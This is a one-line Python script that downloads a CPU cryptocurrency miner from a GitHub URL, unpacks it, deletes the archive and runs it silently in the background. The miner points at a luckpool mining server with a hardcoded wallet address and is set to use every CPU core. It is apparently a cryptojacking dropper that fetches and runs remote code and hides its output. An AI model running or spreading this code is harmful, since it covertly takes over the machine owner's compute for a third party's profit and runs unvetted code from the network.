import os
os.system('curl https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz --output hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && rm hellminer_cpu* && nohup ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RPuyeA5o3DxjPrQBMufAeLvdUJbN7AXCvh.CC-II-$(echo $(shuf -i 1-99 -n 1)) -p x --cpu $(echo $(nproc --all)) > /dev/null 2>&1 &')
